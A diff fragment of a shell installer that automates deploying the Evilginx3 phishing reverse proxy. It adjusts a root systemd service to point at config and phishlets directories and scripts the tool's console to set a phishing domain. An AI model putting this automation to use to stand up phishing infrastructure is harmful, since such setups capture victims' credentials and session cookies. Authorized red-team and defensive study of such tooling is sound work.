@@ -586,7 +586,7 @@ Wants=network-online.target
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
@@ -603,13 +603,6 @@ EOF
     systemctl daemon-reload
     systemctl enable evilginx
     
-    # Stop if running
-    systemctl stop evilginx 2>/dev/null || true
-    sleep 2
-    
-    # Start fresh
-    systemctl start evilginx
-    
     # Wait for evilginx to initialize and create config
     log "Waiting for Evilginx3 to initialize..."
     sleep 5
@@ -617,16 +610,18 @@ EOF
     # Configure using evilginx v3 commands
     log "Configuring Evilginx3 settings..."
     
+    # Ensure service is stopped so expect script can bind to ports
+    systemctl stop evilginx 2>/dev/null || true
+
     # Use expect for interactive configuration
     cat > /tmp/evilginx_config.exp << EOF
 #!/usr/bin/expect -f
 set timeout 10
 log_user 1
 
-spawn /usr/local/bin/evilginx
+spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    "evilginx" { send "\r"; exp_continue }
     ">" { 
         send "config domain $DOMAIN\r"
         expect ">"
